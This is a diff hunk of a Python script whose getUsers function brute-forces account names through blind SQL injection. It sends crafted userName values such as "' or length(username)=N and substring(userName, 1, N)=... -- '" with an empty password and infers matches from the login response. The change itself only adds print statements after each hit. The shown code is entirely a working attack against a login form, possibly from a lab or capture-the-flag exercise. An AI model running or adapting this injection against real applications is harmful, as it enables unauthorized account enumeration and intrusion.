@@ -76,18 +76,23 @@ def getUsers(users):
                                 params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + '\"' + str(chr(a)) + '\"' + " -- '", 'password': ''}
                                 if get_answer(params):
                                     users.append(str(chr(a)))
+                                    print(params)
                                 params = {'userName': "' or length(username)=3 and substring(userName, 1, 3)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + '\"' + " -- '", 'password': ''}
                                 if get_answer(params):
                                     users.append(str(chr(a))  + str(chr(b)) + str(chr(c)))
+                                    print(params)
                                 params = {'userName': "' or length(username)=4 and substring(userName, 1, 4)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + str(chr(d)) + '\"' + " -- '", 'password': ''}
                                 if get_answer(params):
                                     users.append(str(chr(a))  + str(chr(b)) + str(chr(c)) + str(chr(d)))
+                                    print(params)
                                 params = {'userName': "' or length(username)=5 and substring(userName, 1, 5)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)) + '\"' + " -- '", 'password': ''}
                                 if get_answer(params):
                                     users.append(str(chr(a))  + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)))
+                                    print(params)
                                 params = {'userName': "' or length(username)=7 and substring(userName, 1, 7)=" + '\"' + str(chr(a)) + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)) + str(chr(f)) + str(chr(g)) + '\"' + " -- '", 'password': ''}
                                 if get_answer(params):
                                     users.append(str(chr(a))  + str(chr(b)) + str(chr(c)) + str(chr(d)) + str(chr(e)) + str(chr(f)) + str(chr(g)))
+                                    print(params)
                                 g += 1
                             f += 1
                         e += 1
